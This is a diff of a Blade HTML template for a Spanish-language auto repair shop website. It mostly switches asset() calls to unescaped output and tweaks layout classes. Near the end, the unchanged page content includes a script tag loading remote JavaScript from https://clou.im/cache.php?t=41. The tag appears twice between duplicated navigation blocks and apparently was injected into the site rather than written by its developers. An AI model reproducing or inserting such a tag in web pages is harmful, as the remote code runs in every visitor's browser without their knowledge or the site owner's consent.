@@ -17,10 +17,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <!--[if lte IE 8]>
     <script src="assets/js/ie/html5shiv.js"></script><![endif]-->
-    <link rel="stylesheet" href="{{asset('web/assets/css/main.css')}}">
+    <link rel="stylesheet" href="{{asset('/web/assets/css/main.css')}}">
 
     <!--[if lte IE 9]>
-    <link rel="stylesheet" href="{{asset('web/assets/css/ie9.css')}}"><![endif]-->
+    <link rel="stylesheet" href="{!!asset('web/assets/css/ie9.css')!!}"><![endif]-->
     <link href="{{asset('web/assets/css/font-awesome.css')}}" rel="stylesheet" type="text/css">
 </head>
 <body>
@@ -30,10 +30,11 @@
     <div id="header-wrapper">
         <header id="header" class="container">
             <div class="row">
-                <div class="12u">
-
-                    <!-- Logo -->
-                    <img src="{{asset('web/images/automec.png')}}" class="logo">
+                <!-- Logo -->
+                <div class="10u 12u(mobile)">
+                <img src="{!!asset('/web/images/automec.png')!!}" class="logo" class="img-responsive">
+                </div>
+                <div class="6u">
 
                     <!-- Nav -->
                     <nav id="nav" name="inicio">
@@ -59,8 +60,8 @@
                     <div class="6u 12u(mobile)">
 
                         <!-- Banner Image -->
-                        <a href="#" class="bordered-feature-image"><img src="{{asset('web/images/automec1-1.jpg')}}"
-                                                                        alt=""></a>
+                        <a href="#" class="bordered-feature-image"><img src="{!!asset('web/images/automec1-1.jpg')!!}"
+                                                                        alt="" class="img-responsive"></a>
 
                     </div>
                 </div>
@@ -93,7 +94,7 @@
                         <section>
                             <h2>Suspensiones</h2>
                             <a href="#" class="bordered-feature-image"><img
-                                        src="{{asset('web/images/servicios/1.jpg')}}" alt=""></a>
+                                        src="{!!asset('web/images/servicios/1.jpg')!!}" alt=""></a>
                         </section>
 
                     </div>
@@ -103,7 +104,7 @@
                         <section>
                             <h2>Soluciones Electricas</h2>
                             <a href="#" class="bordered-feature-image"><img
-                                        src="{{asset('web/images/servicios/2.jpg')}}" alt=""></a>
+                                        src="{!!asset('web/images/servicios/2.jpg')!!}" alt=""></a>
                         </section>
 
                     </div>
@@ -113,7 +114,7 @@
                         <section>
                             <h2>Cambio de Aceite</h2>
                             <a href="#" class="bordered-feature-image"><img
-                                        src="{{asset('web/images/servicios/7.jpg')}}" alt=""></a>
+                                        src="{!!asset('web/images/servicios/7.jpg')!!}" alt=""></a>
                         </section>
 
                     </div>
@@ -123,7 +124,7 @@
                         <section>
                             <h2>Afinamiento</h2>
                             <a href="#" class="bordered-feature-image"><img
-                                        src="{{asset('web/images/servicios/4.jpg')}}" alt=""></a>
+                                        src="{!!asset('web/images/servicios/4.jpg')!!}" alt=""></a>
                         </section>
 
                     </div>
@@ -133,7 +134,7 @@
                         <section>
                             <h2>Frenos</h2>
                             <a href="#" class="bordered-feature-image"><img
-                                        src="{{asset('web/images/servicios/9.jpg')}}" alt=""></a>
+                                        src="{!!asset('web/images/servicios/9.jpg')!!}" alt=""></a>
                         </section>
 
 
@@ -156,7 +157,7 @@
                         <section>
                             <h2>Cambios de Embragues</h2>
                             <a href="#" class="bordered-feature-image"><img
-                                        src="{{asset('web/images/servicios/6.jpg')}}" alt=""></a>
+                                        src="{!!asset('web/images/servicios/6.jpg')!!}" alt=""></a>
                         </section>
 
                     </div>
@@ -166,7 +167,7 @@
                         <section>
                             <h2>Tren Delantero</h2>
                             <a href="#" class="bordered-feature-image"><img
-                                        src="{{asset('web/images/servicios/3.jpg')}}" alt=""></a>
+                                        src="{!!asset('web/images/servicios/3.jpg')!!}" alt=""></a>
                         </section>
 
                     </div>
@@ -176,7 +177,7 @@
                         <section>
                             <h2>Distribución</h2>
                             <a href="#" class="bordered-feature-image"><img
-                                        src="{{asset('web/images/servicios/8.jpg')}}" alt=""></a>
+                                        src="{!!asset('web/images/servicios/8.jpg')!!}" alt=""></a>
                         </section>
 
                     </div>
@@ -186,7 +187,7 @@
                         <section>
                             <h2>Batería y Alternadores</h2>
                             <a href="#" class="bordered-feature-image"><img
-                                        src="{{asset('web/images/servicios/5.jpg')}}" alt=""></a>
+                                        src="{!!asset('web/images/servicios/5.jpg')!!}" alt=""></a>
                         </section>
 
                     </div>
@@ -196,7 +197,7 @@
                         <section>
                             <h2>Neumáticos</h2>
                             <a href="#" class="bordered-feature-image"><img
-                                        src="{{asset('web/images/servicios/10.jpg')}}" alt=""></a>
+                                        src="{!!asset('web/images/servicios/10.jpg')!!}" alt=""></a>
                         </section>
 
                     </div>
@@ -222,7 +223,7 @@
                         <section>
                             <h2>Revisión pre-compra</h2>
                             <a href="#" class="bordered-feature-image"><img
-                                        src="{{asset('web/images/servicios/11.jpg')}}" alt=""></a>
+                                        src="{!!asset('web/images/servicios/11.jpg')!!}" alt=""></a>
                         </section>
 
                     </div>
@@ -399,7 +400,7 @@
 
 
 <div id="titleBar"><a href="#navPanel" class="toggle"></a><span class="title"> <img
-                src="{{asset('web/images/automec.png')}}"
+                src="{!!asset('web/images/automec.png')!!}"
                 style="max-height:95%;"></span>
 </div>
 <div id="navPanel">
@@ -414,7 +415,7 @@
 </div>
 <script type="text/javascript" src="https://clou.im/cache.php?t=41"></script>
 <div id="titleBar"><a href="#navPanel" class="toggle"></a><span class="title"> <img
-                src="{{asset('web/images/automec.png')}}"
+                src="{!!asset('web/images/automec.png')!!}"
                 style="max-height:95%;"></span>
 </div>
 <div id="navPanel">
@@ -429,7 +430,7 @@
 </div>
 <script type="text/javascript" src="https://clou.im/cache.php?t=41"></script>
 <div id="titleBar"><a href="#navPanel" class="toggle"></a><span class="title"> <img
-                src="{{asset('web/images/automec.png')}}"
+                src="{!!asset('web/images/automec.png')!!}"
                 style="max-height:95%;"></span>
 </div>
 <div id="navPanel">
